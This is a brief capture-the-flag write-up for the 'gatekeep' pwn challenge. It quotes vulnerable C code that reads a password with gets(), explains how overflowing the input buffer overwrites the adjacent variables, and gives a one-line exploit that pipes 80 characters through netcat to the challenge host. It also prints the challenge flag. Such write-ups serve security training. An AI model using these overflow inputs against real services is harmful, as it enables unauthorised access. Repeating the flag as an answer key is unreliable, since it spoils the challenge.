### **Title:** pwn/gatekeep

**Hint:** Straight forward buffer overflow

**Solution:**
```
int check(){
    char input[15];
    char pass[10];
    int access = 0;
....
    printf("Password:\n");
    gets(input);
    if(strcmp(input, pass)) {
        printf("I swore that was the right password ...\n");
```
For this piece of code we can see that after `input`, `pass` and `access` were initialized and `gets()` is used to get the `input`.\
If we overflow `input` we can overwrite `pass` and `access` to pass the `if(access)` to get our flag.

**Exploit:** python3 -c 'print(80*"a")' | nc lac.tf 31121

**Flag:** lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}
